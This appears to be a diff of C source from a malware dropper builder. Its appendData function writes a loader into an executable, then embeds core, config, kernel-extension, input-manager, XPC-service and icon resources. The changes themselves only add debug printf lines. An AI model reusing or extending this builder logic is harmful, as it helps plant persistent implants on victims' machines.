@@ -281,14 +281,12 @@ int appendData (char *inputFilePointer,
     {
       memset(&strings, 0, sizeof (stringTable));
 #ifdef WIN32
+	  printf("_string_%d %s\n", z, _strings[z]);
       strncpy_s(strings.value, sizeof(strings.value), _strings[z], _TRUNCATE);
 #else
       strncpy (strings.value, _strings[z], sizeof (strings.value));
 #endif
 
-#ifdef DEBUG_VERBOSE
-      printf ("string: %s\n", _strings[z]);
-#endif
       strings.type = STRING_DATA;
       
       memcpy(outputFilePointer + offset, &strings, sizeof (stringTable));
@@ -333,10 +331,11 @@ int appendData (char *inputFilePointer,
 #endif
   memmove(outputFilePointer + offset - 1, &ep, 3);
   offset += 3;
-  
+
   //
   // Now append our loader
   //
+
   memcpy(outputFilePointer + offset,
          dropperStart,
          (_mSize_t)DROPPER_CODE_SIZE);
@@ -351,6 +350,7 @@ int appendData (char *inputFilePointer,
   //
   // CORE
   //
+  printf("[ii] Core %s, installpath: %s\n", coreFileName, installPath);
   resource.type = RESOURCE_CORE;
   memset(resource.name, 0, strlen(resource.name));
   memcpy(resource.name, coreFileName, sizeof(resource.name));
@@ -400,6 +400,8 @@ int appendData (char *inputFilePointer,
   //
   // CONF
   //
+  printf("[ii] Conf %s\n", confFileName);
+
   resource.type = RESOURCE_CONF;
   memset(resource.name, 0, sizeof(resource.name));
   memcpy(resource.name, confFileName, sizeof(resource.name));
@@ -447,6 +449,7 @@ int appendData (char *inputFilePointer,
   //
   // KEXT32
   //
+  printf("[ii] Kext32 %s\n", kext32FileName);
   resource.type = RESOURCE_KEXT;
   memset(resource.name, 0, sizeof(resource.name));
   memcpy(resource.name, kext32FileName, sizeof(resource.name));
@@ -498,6 +501,7 @@ int appendData (char *inputFilePointer,
   //
   // KEXT64
   //
+  printf("[ii] Kext64 %s\n", kext64FileName);
   resource.type = RESOURCE_KEXT;
   memset(resource.name, 0, sizeof(resource.name));
   memcpy(resource.name, kext64FileName, sizeof(resource.name));
@@ -549,6 +553,7 @@ int appendData (char *inputFilePointer,
   //
   // INPUT MANAGER
   //
+  printf("[ii] InputManager %s\n", inputManagerFileName);
   resource.type = RESOURCE_IN_MANAGER;
   memset (resource.name, 0, sizeof (resource.name));
   memcpy (resource.name, inputManagerFileName, sizeof (resource.name));
@@ -593,6 +598,8 @@ int appendData (char *inputFilePointer,
   //
   // XPC service
   //
+  printf("[ii] XPC %s\n", XPCFileName);
+
   resource.type = RESOURCE_IN_MANAGER;
   memset (resource.name, 0, sizeof (resource.name));
   memcpy (resource.name, XPCFileName, sizeof (resource.name));
@@ -637,6 +644,8 @@ int appendData (char *inputFilePointer,
   //
   // ICON
   //
+  printf("[ii] Icon %s\n", iconFileName);
+
   resource.type = RESOURCE_ICON;
   memset (resource.name, 0, sizeof (resource.name));
   memcpy (resource.name, iconFileName, sizeof (resource.name));
@@ -684,6 +693,8 @@ int appendData (char *inputFilePointer,
   if(bitmapFileName != NULL)
     {
 	  // Bitmap file for demo
+	printf("[ii] Bitmap %s\n", bitmapFileName);
+
 	  resource.type = RESOURCE_BITMAP;
 	  memset (resource.name, 0, sizeof (resource.name));
 	  memcpy (resource.name, bitmapFileName, sizeof (resource.name));
